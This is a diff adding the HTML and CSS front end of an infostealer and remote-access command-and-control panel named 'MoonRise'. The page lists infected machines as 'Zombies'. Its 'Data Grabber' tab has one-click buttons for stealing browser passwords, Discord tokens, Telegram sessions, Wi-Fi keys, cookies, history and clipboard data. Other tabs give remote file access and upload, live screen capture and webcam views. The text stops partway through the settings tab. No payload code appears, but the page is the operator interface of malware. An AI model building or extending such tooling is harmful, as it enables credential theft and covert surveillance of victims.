@@ -1,0 +1,2932 @@
+<!DOCTYPE html>
+<html lang="en" class="antialiased">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>MoonRise // C2 Command Center</title>
+    
+    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    
+    <link href="/static/css/mobile-critical.css" rel="stylesheet">
+    <link href="/static/css/main.css" rel="stylesheet">
+    <link href="/static/css/responsive.css" rel="stylesheet">
+    <link href="/static/css/mobile-fixes.css" rel="stylesheet">
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: { 
+                        void: '#030304', 
+                        surface: '#0f0f11', 
+                        theme: 'var(--theme-color)',
+                        'theme-dim': 'color-mix(in srgb, var(--theme-color), transparent 85%)'
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                    },
+                    animation: { 
+                        'fade-in': 'fadeIn 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards',
+                        'pulse-slow': 'pulseGlow 3s infinite'
+                    },
+                    keyframes: { 
+                        fadeIn: { '0%': { opacity: 0, transform: 'translateY(10px) scale(0.98)' }, '100%': { opacity: 1, transform: 'translateY(0) scale(1)' } },
+                        pulseGlow: { '0%, 100%': { opacity: 1, boxShadow: '0 0 10px var(--theme-color)' }, '50%': { opacity: 0.6, boxShadow: '0 0 20px var(--theme-color)' } }
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        .mobile-menu-btn {
+            display: none;
+        }
+
+        @media (max-width: 768px) {
+            .mobile-menu-btn {
+                display: inline-flex !important;
+                background: transparent !important;
+                border: none !important;
+                box-shadow: none !important;
+            }
+
+            header .fa-ghost {
+                text-shadow: none !important;
+                filter: none !important;
+            }
+
+            .drop-shadow-\[0_0_8px_rgba\(255\,255\,255\,0\.5\)\] {
+                filter: none !important;
+            }
+
+            nav i {
+                background: none !important;
+                background-image: none !important;
+                -webkit-background-clip: border-box !important;
+                -webkit-text-fill-color: currentColor !important;
+                filter: none !important;
+            }
+        }
+
+        .sidebar-overlay {
+            display: none;
+        }
+
+        .w-72 .relative {
+            position: relative;
+        }
+
+        .w-72 .fa-search {
+            pointer-events: none;
+            z-index: 10;
+        }
+
+        #bgVideo {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            z-index: -1;
+            opacity: 0.3;
+            filter: blur(0px);
+            transition: opacity 0.3s, filter 0.3s;
+            pointer-events: none;
+        }
+
+        body {
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+        }
+
+        .country-flag {
+            font-size: 1.2em;
+            line-height: 1;
+            display: inline-block;
+            vertical-align: middle;
+        }
+
+        [id^="bgType"][data-active="true"] {
+            background: var(--theme-color) !important;
+            color: black !important;
+            border-color: var(--theme-color) !important;
+        }
+
+        #speakerOutput:checked ~ div {
+            border-color: var(--theme-color);
+            background: color-mix(in srgb, var(--theme-color), transparent 80%);
+        }
+
+        #speakerOutput:checked ~ div i {
+            opacity: 1;
+        }
+
+        #speakerOutput:hover ~ div {
+            border-color: rgba(255, 255, 255, 0.4);
+        }
+
+        #newUserAdmin:checked ~ div {
+            border-color: var(--theme-color);
+            background: color-mix(in srgb, var(--theme-color), transparent 80%);
+        }
+
+        #newUserAdmin:checked ~ div i {
+            opacity: 1;
+        }
+
+        #newUserAdmin:hover ~ div {
+            border-color: rgba(255, 255, 255, 0.4);
+        }
+
+        .blur-key {
+            transition: filter 0.3s ease;
+        }
+
+        .blur-key:hover {
+            filter: blur(0px) !important;
+        }
+        
+        /* Fullscreen webcam styles */
+        #webcamContainer:fullscreen {
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        #webcamContainer:fullscreen .aspect-video {
+            width: 100vw;
+            height: 100vh;
+            max-width: 100vw;
+            max-height: 100vh;
+        }
+        
+        #webcamContainer:fullscreen #camImg {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        
+        /* Webkit fullscreen */
+        #webcamContainer:-webkit-full-screen {
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        #webcamContainer:-webkit-full-screen .aspect-video {
+            width: 100vw;
+            height: 100vh;
+            max-width: 100vw;
+            max-height: 100vh;
+        }
+        
+        #webcamContainer:-webkit-full-screen #camImg {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        
+        /* Fullscreen screen styles */
+        #screenContainer:fullscreen {
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        #screenContainer:fullscreen .aspect-video {
+            width: 100vw;
+            height: 100vh;
+            max-width: 100vw;
+            max-height: 100vh;
+        }
+        
+        #screenContainer:fullscreen #screenImg {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        
+        /* Webkit fullscreen for screen */
+        #screenContainer:-webkit-full-screen {
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        #screenContainer:-webkit-full-screen .aspect-video {
+            width: 100vw;
+            height: 100vh;
+            max-width: 100vw;
+            max-height: 100vh;
+        }
+        
+        #screenContainer:-webkit-full-screen #screenImg {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+    </style>
+</head>
+<body class="h-screen flex items-center justify-center selection:bg-theme selection:text-black">
+    <video id="bgVideo" autoplay loop muted playsinline style="display: none;"></video>
+
+    <div class="w-[96%] h-[94vh] glass-panel rounded-2xl flex flex-col relative overflow-hidden animate-fade-in">
+        
+        <header class="h-14 px-6 flex justify-between items-center border-b border-white/5 bg-black/40 shrink-0">
+            <div class="flex items-center gap-4 select-none">
+                <button class="mobile-menu-btn" onclick="toggleMobileSidebar()" title="Menu">
+                    <i class="fas fa-bars"></i>
+                </button>
+                
+                <div class="relative">
+                    <i class="fas fa-ghost text-theme text-xl"></i>
+                </div>
+                <div>
+                    <h1 class="font-bold tracking-tight text-lg text-white leading-none">MOON<span class="text-theme">RISE</span></h1>
+                    <span class="text-[9px] text-zinc-500 font-mono tracking-[0.2em] uppercase">Ultimate C2 Panel</span>
+                </div>
+            </div>
+            
+            <div class="flex items-center gap-3">
+                <div class="flex items-center gap-3 bg-white/5 px-4 py-1.5 rounded-full border border-white/5 backdrop-blur-md">
+                    <div class="w-2 h-2 rounded-full bg-red-500 animate-pulse" id="statusDot"></div>
+                    <div class="text-[10px] text-zinc-300 font-mono uppercase tracking-wide" id="statusText">Disconnected</div>
+                </div>
+                
+                <button onclick="logout()" class="group flex items-center gap-2 bg-red-500/10 hover:bg-red-500/20 border border-red-500/20 hover:border-red-500/40 px-4 py-1.5 rounded-full transition-all" title="Logout">
+                    <i class="fas fa-sign-out-alt text-red-400 text-xs group-hover:scale-110 transition-transform"></i>
+                    <span class="text-[10px] text-red-400 font-mono uppercase tracking-wide hidden md:inline">Logout</span>
+                </button>
+            </div>
+        </header>
+
+        <div class="flex flex-1 overflow-hidden">
+            <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleMobileSidebar()"></div>
+
+            <div class="w-72 border-r border-white/5 bg-black/20 flex flex-col shrink-0 backdrop-blur-sm" id="sidebar">
+                <div class="p-4">
+                    <h3 class="text-[10px] font-bold text-zinc-600 uppercase tracking-widest mb-3 flex justify-between">
+                        <span>Zombies</span>
+                        <i class="fas fa-network-wired"></i>
+                    </h3>
+                    <div class="relative">
+                        <i class="fas fa-search absolute left-3 top-1/2 -translate-y-1/2 text-xs text-zinc-600 pointer-events-none z-10"></i>
+                        <input id="clientSearch" type="text" placeholder="Search client..." onkeyup="filterClients()" class="w-full bg-white/5 border border-white/10 rounded-lg py-2 pl-9 pr-3 text-xs text-zinc-300 focus:outline-none focus:border-theme transition-all placeholder:text-zinc-700">
+                    </div>
+                </div>
+                <div id="clientList" class="flex-1 overflow-y-auto space-y-1 p-2 custom-scroll">
+                    <div class="text-center mt-12 text-xs text-zinc-700 italic font-mono">
+                        <i class="fas fa-spinner fa-spin mb-2 text-lg"></i><br>Waiting for connection...
+                    </div>
+                </div>
+                
+                <div class="p-3 bg-black/40 border-t border-white/5 text-[10px] text-zinc-600 text-center font-mono">
+                    Session ID: <span class="text-zinc-500">#AF-992</span>
+                </div>
+            </div>
+
+            <div class="flex-1 flex flex-col relative bg-[#050507]/60">
+                
+                <nav class="h-12 border-b border-white/5 bg-black/20 flex items-center px-2 shrink-0 gap-1 overflow-x-auto custom-scroll backdrop-blur-md">
+                    <button onclick="switchTab('info')" class="nav-btn px-4 h-full text-[11px] font-bold uppercase tracking-widest" data-active="true" data-tooltip="Info"><i class="fas fa-info-circle mr-2"></i>Info</button>
+                    <button onclick="switchTab('files')" class="nav-btn px-4 h-full text-[11px] font-bold uppercase tracking-widest" data-tooltip="Files"><i class="fas fa-folder-open mr-2"></i>Files</button>
+                    <button onclick="switchTab('screen')" class="nav-btn px-4 h-full text-[11px] font-bold uppercase tracking-widest" data-tooltip="View"><i class="fas fa-desktop mr-2"></i>View</button>
+                    
+                    <div class="flex-1"></div>
+                    <button onclick="switchTab('settings')" class="nav-btn px-4 h-full text-[11px] font-bold uppercase tracking-widest text-zinc-500 hover:text-white" data-tooltip="Config"><i class="fas fa-cog mr-2"></i>Config</button>
+                </nav>
+
+                <div class="relative flex-1 overflow-hidden">
+
+                    <div id="info-tab" class="tab-content absolute inset-0 p-10 overflow-y-auto custom-scroll animate-fade-in">
+                        <div class="flex items-center justify-between mb-6">
+                            <h2 class="text-2xl font-bold text-white flex items-center">
+                                <i class="fas fa-fingerprint text-theme mr-3"></i>Identity Overview
+                            </h2>
+                            <button onclick="forceRefreshInfo()" class="bg-theme/20 hover:bg-theme/30 text-theme border border-theme/30 px-4 py-2 rounded-lg text-xs font-bold transition-all">
+                                <i class="fas fa-sync-alt mr-2"></i>Refresh Info
+                            </button>
+                        </div>
+                        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 max-w-6xl">
+                            <div class="bg-surface/50 border border-white/5 rounded-2xl p-6 relative overflow-hidden group hover:border-theme/30 transition-all duration-300">
+                                <div class="absolute -right-6 -top-6 text-[150px] text-white opacity-[0.02] group-hover:opacity-[0.05] transition"><i class="fas fa-globe-americas"></i></div>
+                                <h3 class="text-xs font-bold text-theme uppercase mb-6 tracking-widest border-b border-white/5 pb-2">Geolocation Data</h3>
+                                <div class="space-y-4" id="geoInfo">
+                                    <p class="text-zinc-500 text-sm italic">Waiting for connection...</p>
+                                </div>
+                            </div>
+                            <div class="bg-surface/50 border border-white/5 rounded-2xl p-6 relative overflow-hidden group hover:border-theme/30 transition-all duration-300">
+                                <div class="absolute -right-6 -top-6 text-[150px] text-white opacity-[0.02] group-hover:opacity-[0.05] transition"><i class="fas fa-microchip"></i></div>
+                                <h3 class="text-xs font-bold text-theme uppercase mb-6 tracking-widest border-b border-white/5 pb-2">Hardware Specs</h3>
+                                <div class="space-y-4" id="sysInfo">
+                                    <p class="text-zinc-500 text-sm italic">Waiting for connection...</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="stealer-tab" class="tab-content hidden absolute inset-0 p-6 flex flex-col overflow-y-auto custom-scroll">
+                        <!-- Header -->
+                        <div class="flex items-center justify-between mb-5">
+                            <div class="flex items-center gap-3">
+                                <div class="w-10 h-10 rounded-xl bg-red-500/10 flex items-center justify-center border border-red-500/10">
+                                    <i class="fas fa-database text-red-400"></i>
+                                </div>
+                                <div>
+                                    <h2 class="text-lg font-bold text-white">Data Grabber</h2>
+                                    <p class="text-[10px] text-zinc-500">Extract sensitive information</p>
+                                </div>
+                            </div>
+                            <div class="flex items-center gap-2">
+                                <button onclick="runStealer('all')" class="bg-white/5 hover:bg-red-500/20 text-zinc-300 hover:text-white border border-white/10 hover:border-red-500/30 px-4 py-2 rounded-lg text-xs font-medium transition-all flex items-center gap-2">
+                                    <i class="fas fa-layer-group text-red-400"></i>Grab All
+                                </button>
+                                <button onclick="downloadStealerLogs()" class="bg-white/5 hover:bg-white/10 text-zinc-400 hover:text-white p-2 rounded-lg transition-all" title="Export logs">
+                                    <i class="fas fa-download text-xs"></i>
+                                </button>
+                                <button onclick="document.getElementById('stealerOutput').value=''" class="bg-white/5 hover:bg-white/10 text-zinc-400 hover:text-white p-2 rounded-lg transition-all" title="Clear console">
+                                    <i class="fas fa-trash text-xs"></i>
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="flex-1 flex gap-5 min-h-0">
+                            <!-- Grabbers Grid -->
+                            <div class="w-72 shrink-0 flex flex-col gap-3 overflow-y-auto custom-scroll pr-2">
+                                <button onclick="runStealer('passwords')" class="stealer-card group">
+                                    <div class="stealer-icon bg-red-500/20 group-hover:bg-red-500/30">
+                                        <i class="fas fa-key text-red-400"></i>
+                                    </div>
+                                    <div class="flex-1 min-w-0">
+                                        <span class="text-xs font-bold text-white block">Passwords</span>
+                                        <span class="text-[9px] text-zinc-500">Chrome, Edge</span>
+                                    </div>
+                                    <i class="fas fa-chevron-right text-zinc-600 group-hover:text-red-400 text-[10px] transition-colors"></i>
+                                </button>
+
+                                <button onclick="runStealer('discord')" class="stealer-card group">
+                                    <div class="stealer-icon bg-purple-500/20 group-hover:bg-purple-500/30">
+                                        <i class="fab fa-discord text-purple-400"></i>
+                                    </div>
+                                    <div class="flex-1 min-w-0">
+                                        <span class="text-xs font-bold text-white block">Discord</span>
+                                        <span class="text-[9px] text-zinc-500">Tokens & accounts</span>
+                                    </div>
+                                    <i class="fas fa-chevron-right text-zinc-600 group-hover:text-purple-400 text-[10px] transition-colors"></i>
+                                </button>
+
+                                <button onclick="runStealer('telegram')" class="stealer-card group">
+                                    <div class="stealer-icon bg-sky-500/20 group-hover:bg-sky-500/30">
+                                        <i class="fab fa-telegram text-sky-400"></i>
+                                    </div>
+                                    <div class="flex-1 min-w-0">
+                                        <span class="text-xs font-bold text-white block">Telegram</span>
+                                        <span class="text-[9px] text-zinc-500">Sessions (tdata)</span>
+                                    </div>
+                                    <i class="fas fa-chevron-right text-zinc-600 group-hover:text-sky-400 text-[10px] transition-colors"></i>
+                                </button>
+
+                                <button onclick="runStealer('wifi')" class="stealer-card group">
+                                    <div class="stealer-icon bg-blue-500/20 group-hover:bg-blue-500/30">
+                                        <i class="fas fa-wifi text-blue-400"></i>
+                                    </div>
+                                    <div class="flex-1 min-w-0">
+                                        <span class="text-xs font-bold text-white block">Wi-Fi</span>
+                                        <span class="text-[9px] text-zinc-500">Saved networks</span>
+                                    </div>
+                                    <i class="fas fa-chevron-right text-zinc-600 group-hover:text-blue-400 text-[10px] transition-colors"></i>
+                                </button>
+
+                                <button onclick="runStealer('history')" class="stealer-card group">
+                                    <div class="stealer-icon bg-green-500/20 group-hover:bg-green-500/30">
+                                        <i class="fas fa-history text-green-400"></i>
+                                    </div>
+                                    <div class="flex-1 min-w-0">
+                                        <span class="text-xs font-bold text-white block">History</span>
+                                        <span class="text-[9px] text-zinc-500">Browser history</span>
+                                    </div>
+                                    <i class="fas fa-chevron-right text-zinc-600 group-hover:text-green-400 text-[10px] transition-colors"></i>
+                                </button>
+
+                                <button onclick="runStealer('cookies')" class="stealer-card group">
+                                    <div class="stealer-icon bg-amber-500/20 group-hover:bg-amber-500/30">
+                                        <i class="fas fa-cookie-bite text-amber-400"></i>
+                                    </div>
+                                    <div class="flex-1 min-w-0">
+                                        <span class="text-xs font-bold text-white block">Cookies</span>
+                                        <span class="text-[9px] text-zinc-500">Session data</span>
+                                    </div>
+                                    <i class="fas fa-chevron-right text-zinc-600 group-hover:text-amber-400 text-[10px] transition-colors"></i>
+                                </button>
+
+                                <button onclick="runStealer('system')" class="stealer-card group">
+                                    <div class="stealer-icon bg-orange-500/20 group-hover:bg-orange-500/30">
+                                        <i class="fas fa-desktop text-orange-400"></i>
+                                    </div>
+                                    <div class="flex-1 min-w-0">
+                                        <span class="text-xs font-bold text-white block">System</span>
+                                        <span class="text-[9px] text-zinc-500">Hardware info</span>
+                                    </div>
+                                    <i class="fas fa-chevron-right text-zinc-600 group-hover:text-orange-400 text-[10px] transition-colors"></i>
+                                </button>
+
+                                <button onclick="runStealer('clipboard')" class="stealer-card group">
+                                    <div class="stealer-icon bg-cyan-500/20 group-hover:bg-cyan-500/30">
+                                        <i class="fas fa-clipboard text-cyan-400"></i>
+                                    </div>
+                                    <div class="flex-1 min-w-0">
+                                        <span class="text-xs font-bold text-white block">Clipboard</span>
+                                        <span class="text-[9px] text-zinc-500">Copied text</span>
+                                    </div>
+                                    <i class="fas fa-chevron-right text-zinc-600 group-hover:text-cyan-400 text-[10px] transition-colors"></i>
+                                </button>
+                            </div>
+                            
+                            <!-- Output Console -->
+                            <div class="flex-1 flex flex-col bg-[#0a0a0c] border border-white/5 rounded-2xl overflow-hidden min-w-0">
+                                <div class="px-4 py-3 bg-gradient-to-r from-red-500/10 to-transparent border-b border-white/5 flex items-center gap-3">
+                                    <div class="flex items-center gap-1.5">
+                                        <div class="w-2.5 h-2.5 rounded-full bg-red-500"></div>
+                                        <div class="w-2.5 h-2.5 rounded-full bg-yellow-500"></div>
+                                        <div class="w-2.5 h-2.5 rounded-full bg-green-500"></div>
+                                    </div>
+                                    <span class="text-[10px] font-bold text-zinc-500 uppercase tracking-wider">Output Console</span>
+                                </div>
+                                <textarea id="stealerOutput" readonly class="flex-1 bg-transparent p-4 font-mono text-xs text-red-400/90 resize-none outline-none custom-scroll leading-relaxed selection:bg-red-500/20" placeholder="// Waiting for commands...&#10;// Click any grabber to start extraction"></textarea>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="files-tab" class="tab-content hidden absolute inset-0 flex flex-col p-6">
+                        <div class="flex items-center gap-3 mb-4 p-2 bg-surface/80 rounded-lg border border-white/5 backdrop-blur-sm">
+                            <span class="text-zinc-600 text-xs font-bold px-2 uppercase tracking-widest">Path</span>
+                            <div class="h-4 w-[1px] bg-white/10"></div>
+                            <input id="filePath" readonly class="flex-1 bg-transparent border-none outline-none text-xs text-theme font-mono tracking-wide">
+                            <button onclick="requestFiles('..')" class="text-zinc-400 hover:text-white transition px-2"><i class="fas fa-level-up-alt"></i></button>
+                            <button onclick="document.getElementById('uploadInput').click()" class="bg-theme/10 hover:bg-theme/20 text-theme border border-theme/20 px-3 py-1 rounded text-[10px] font-bold uppercase transition"><i class="fas fa-upload mr-1"></i> Upload</button>
+                            <input type="file" id="uploadInput" class="hidden" onchange="uploadFile(this)">
+                        </div>
+                        
+                        <div class="flex-1 bg-surface/50 border border-white/5 rounded-xl overflow-hidden flex flex-col backdrop-blur-md">
+                            <div class="grid grid-cols-12 px-5 py-3 border-b border-white/5 text-[10px] text-zinc-500 font-bold uppercase tracking-widest bg-black/20">
+                                <div class="col-span-7">Filename</div>
+                                <div class="col-span-2 text-right">Size</div>
+                                <div class="col-span-3 text-right">Actions</div>
+                            </div>
+                            <div id="fileList" class="overflow-y-auto custom-scroll p-2 space-y-1"></div>
+                        </div>
+                    </div>
+
+                    <div id="screen-tab" class="tab-content hidden absolute inset-0 p-6 overflow-y-auto custom-scroll">
+                        <div class="max-w-7xl mx-auto">
+                            <!-- Header -->
+                            <div class="mb-6">
+                                <h2 class="text-xl font-bold text-white mb-2 flex items-center gap-2">
+                                    <i class="fas fa-desktop text-theme"></i>
+                                    Screen Stream
+                                </h2>
+                                <p class="text-sm text-zinc-500">Live desktop capture with advanced controls</p>
+                            </div>
+
+                            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                                <!-- Settings Panel -->
+                                <div class="lg:col-span-1 space-y-4">
+                                    <!-- Quality -->
+                                    <div class="bg-surface/50 border border-white/5 rounded-xl p-4 backdrop-blur-md">
+                                        <h3 class="text-xs font-bold text-zinc-400 uppercase mb-3 flex items-center gap-2">
+                                            <i class="fas fa-sliders-h text-theme text-[10px]"></i>
+                                            Quality
+                                        </h3>
+                                        <div class="space-y-2">
+                                            <div class="flex justify-between text-[10px] text-zinc-500">
+                                                <span>JPEG Quality</span>
+                                                <span id="screenQualityValue">40%</span>
+                                            </div>
+                                            <input type="range" id="screenQualitySlider" min="10" max="100" value="40" class="w-full h-2 bg-white/10 rounded-lg appearance-none cursor-pointer accent-theme" oninput="document.getElementById('screenQualityValue').textContent = this.value + '%'; updateScreenQuality(this.value)">
+                                            <div class="flex justify-between text-[9px] text-zinc-600">
+                                                <span>Low</span>
+                                                <span>Ultra</span>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- FPS -->
+                                    <div class="bg-surface/50 border border-white/5 rounded-xl p-4 backdrop-blur-md">
+                                        <h3 class="text-xs font-bold text-zinc-400 uppercase mb-3 flex items-center gap-2">
+                                            <i class="fas fa-tachometer-alt text-theme text-[10px]"></i>
+                                            Refresh Rate
+                                        </h3>
+                                        <select id="screenFpsSelect" onchange="updateScreenFPS(this.value)" class="w-full bg-black/40 border border-white/20 rounded-lg px-3 py-2 text-xs text-white focus:border-theme outline-none transition-all">
+                                            <option value="1">1 FPS (Slow)</option>
+                                            <option value="2">2 FPS</option>
+                                            <option value="3">3 FPS</option>
+                                            <option value="5">5 FPS</option>
+                                            <option value="10">10 FPS</option>
+                                            <option value="30" selected>30 FPS (Smooth)</option>
+                                            <option value="60">60 FPS (Ultra)</option>
+                                            <option value="240">240 FPS (Extreme)</option>
+                                        </select>
+                                        <p class="text-[10px] text-zinc-600 mt-2">Seconds between captures</p>
+                                    </div>
+
+                                    <!-- Resolution -->
+                                    <div class="bg-surface/50 border border-white/5 rounded-xl p-4 backdrop-blur-md">
+                                        <h3 class="text-xs font-bold text-zinc-400 uppercase mb-3 flex items-center gap-2">
+                                            <i class="fas fa-expand text-theme text-[10px]"></i>
+                                            Resolution
+                                        </h3>
+                                        <select id="screenResolutionSelect" onchange="updateScreenResolution(this.value)" class="w-full bg-black/40 border border-white/20 rounded-lg px-3 py-2 text-xs text-white focus:border-theme outline-none transition-all">
+                                            <option value="800x600" selected>800x600 (Default)</option>
+                                            <option value="1280x720">1280x720 (HD)</option>
+                                            <option value="1920x1080">1920x1080 (Full HD)</option>
+                                            <option value="full">Full Resolution</option>
+                                        </select>
+                                        <p class="text-[10px] text-zinc-600 mt-2">Higher = better quality, slower</p>
+                                    </div>
+
+                                    <!-- Actions -->
+                                    <div class="bg-surface/50 border border-white/5 rounded-xl p-4 backdrop-blur-md">
+                                        <h3 class="text-xs font-bold text-zinc-400 uppercase mb-3 flex items-center gap-2">
+                                            <i class="fas fa-bolt text-theme text-[10px]"></i>
+                                            Actions
+                                        </h3>
+                                        <div class="space-y-2">
+                                            <button id="screenStartBtn" onclick="startScreenStream()" class="w-full bg-green-500/20 hover:bg-green-500/30 text-green-400 border border-green-500/30 hover:border-green-500/50 py-2.5 rounded-lg text-xs font-bold transition-all flex items-center justify-center gap-2 outline-none focus:outline-none">
+                                                <i class="fas fa-play text-[10px]"></i>
+                                                Start Stream
+                                            </button>
+                                            <button id="screenStopBtn" onclick="stopScreenStream()" class="w-full bg-red-500/20 hover:bg-red-500/30 text-red-400 border border-red-500/30 hover:border-red-500/50 py-2.5 rounded-lg text-xs font-bold transition-all flex items-center justify-center gap-2 outline-none focus:outline-none hidden">
+                                                <i class="fas fa-stop text-[10px]"></i>
+                                                Stop Stream
+                                            </button>
+                                            <button onclick="takeScreenSnapshot()" class="w-full bg-white/5 hover:bg-white/10 text-zinc-300 hover:text-white border border-white/10 hover:border-theme/30 py-2.5 rounded-lg text-xs font-bold transition-all flex items-center justify-center gap-2 outline-none focus:outline-none">
+                                                <i class="fas fa-camera text-[10px]"></i>
+                                                Take Screenshot
+                                            </button>
+                                        </div>
+                                    </div>
+
+                                    <!-- Stats -->
+                                    <div class="bg-surface/50 border border-white/5 rounded-xl p-4 backdrop-blur-md">
+                                        <h3 class="text-xs font-bold text-zinc-400 uppercase mb-3 flex items-center gap-2">
+                                            <i class="fas fa-chart-line text-theme text-[10px]"></i>
+                                            Statistics
+                                        </h3>
+                                        <div class="space-y-2 text-[10px]">
+                                            <div class="flex justify-between">
+                                                <span class="text-zinc-500">Status:</span>
+                                                <span id="screenStatusText2" class="text-zinc-400 font-mono">Waiting</span>
+                                            </div>
+                                            <div class="flex justify-between">
+                                                <span class="text-zinc-500">Frames:</span>
+                                                <span id="screenFrameCount" class="text-zinc-400 font-mono">0</span>
+                                            </div>
+                                            <div class="flex justify-between">
+                                                <span class="text-zinc-500">Last Update:</span>
+                                                <span id="screenLastUpdate" class="text-zinc-400 font-mono">--:--</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Screen Display -->
+                                <div class="lg:col-span-2">
+                                    <div id="screenContainer" class="relative border border-white/10 rounded-2xl overflow-hidden bg-black shadow-2xl">
+                                        <!-- Status Badge -->
+                                        <div class="absolute top-4 left-4 flex items-center gap-2 z-10 bg-black/70 backdrop-blur px-3 py-1.5 rounded-full border border-white/10">
+                                            <div id="screenStatusDot" class="w-2 h-2 rounded-full bg-green-500 animate-pulse transition-all"></div>
+                                            <span id="screenStatusText" class="text-[10px] text-white font-bold uppercase tracking-widest">Streaming</span>
+                                        </div>
+                                        
+                                        <!-- Fullscreen Button -->
+                                        <button onclick="toggleScreenFullscreen()" class="absolute top-4 right-4 z-10 bg-black/70 backdrop-blur px-3 py-1.5 rounded-full border border-white/10 hover:border-theme/50 transition-all outline-none focus:outline-none group">
+                                            <i class="fas fa-expand text-white text-[10px] group-hover:text-theme transition-colors"></i>
+                                        </button>
+                                        
+                                        <!-- Screen Container -->
+                                        <div class="aspect-video bg-gradient-to-br from-zinc-900 to-black flex items-center justify-center relative">
+                                            <img id="screenImg" class="max-w-full max-h-full object-contain">
+                                            <div id="screenPlaceholder" class="text-zinc-600 flex flex-col items-center">
+                                                <i class="fas fa-desktop text-6xl mb-4 opacity-10"></i>
+                                                <span class="text-sm font-mono tracking-widest opacity-30">Waiting for screen capture...</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="settings-tab" class="tab-content hidden absolute inset-0 p-6 overflow-y-auto custom-scroll">
+                        <div class="max-w-4xl mx-auto">
+                            <!-- Header -->
+                            <div class="mb-8 flex items-center gap-4">
+                                <div class="w-12 h-12 rounded-2xl bg-gradient-to-br from-theme/30 to-theme/10 flex items-center justify-center border border-theme/20">
+                                    <i class="fas fa-cog text-theme text-xl"></i>
+                                </div>
+                                <div>
+                                    <h2 class="text-2xl font-bold text-white">Configuration</h2>
+                                    <p class="text-sm text-zinc-500">Customize your command center</p>
+                                </div>
+                            </div>
+
+                            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                                <!-- Left Column -->
+                                <div class="space-y-6">
+                                    <!-- Accent Color -->
+                                    <div class="bg-surface/60 border border-white/5 rounded-2xl p-5 backdrop-blur-sm hover:border-theme/20 transition-all group">
+                                        <div class="flex items-center gap-3 mb-4">
+                                            <div class="w-8 h-8 rounded-lg bg-theme/20 flex items-center justify-center">
+                                                <i class="fas fa-palette text-theme text-sm"></i>
+                                            </div>
+                                            <h3 class="text-sm font-bold text-white">Accent Color</h3>
+                                        </div>
+                                        <div class="grid grid-cols-6 gap-2 mb-4">
+                                            <button onclick="setTheme('#c084fc')" class="w-full aspect-square rounded-xl bg-[#c084fc] hover:scale-110 transition-all shadow-lg hover:shadow-[0_0_20px_#c084fc] border-2 border-transparent hover:border-white/30"></button>
+                                            <button onclick="setTheme('#22c55e')" class="w-full aspect-square rounded-xl bg-[#22c55e] hover:scale-110 transition-all shadow-lg hover:shadow-[0_0_20px_#22c55e] border-2 border-transparent hover:border-white/30"></button>
+                                            <button onclick="setTheme('#3b82f6')" class="w-full aspect-square rounded-xl bg-[#3b82f6] hover:scale-110 transition-all shadow-lg hover:shadow-[0_0_20px_#3b82f6] border-2 border-transparent hover:border-white/30"></button>
+                                            <button onclick="setTheme('#ef4444')" class="w-full aspect-square rounded-xl bg-[#ef4444] hover:scale-110 transition-all shadow-lg hover:shadow-[0_0_20px_#ef4444] border-2 border-transparent hover:border-white/30"></button>
+                                            <button onclick="setTheme('#f59e0b')" class="w-full aspect-square rounded-xl bg-[#f59e0b] hover:scale-110 transition-all shadow-lg hover:shadow-[0_0_20px_#f59e0b] border-2 border-transparent hover:border-white/30"></button>
+                                            <button onclick="setTheme('#06b6d4')" class="w-full aspect-square rounded-xl bg-[#06b6d4] hover:scale-110 transition-all shadow-lg hover:shadow-[0_0_20px_#06b6d4] border-2 border-transparent hover:border-white/30"></button>
+                                        </div>
+                                        <div class="flex items-center gap-3 p-3 bg-black/30 rounded-xl">
+                                            <input type="color" id="customColorPicker" onchange="setTheme(this.value)" class="w-10 h-10 rounded-lg cursor-pointer border-0 bg-transparent">
+                                            <span class="text-xs text-zinc-400">Custom Color</span>
+                                        </div>
+                                    </div>
+
+                                    <!-- Background Media -->
+                                    <div class="bg-surface/60 border border-white/5 rounded-2xl p-5 backdrop-blur-sm hover:border-theme/20 transition-all">
+                                        <div class="flex items-center gap-3 mb-4">
+                                            <div class="w-8 h-8 rounded-lg bg-purple-500/20 flex items-center justify-center">
+                                                <i class="fas fa-image text-purple-400 text-sm"></i>
+                                            </div>
+                                            <h3 class="text-sm font-bold text-white">Background</h3>
+                                        </div>
+                                        
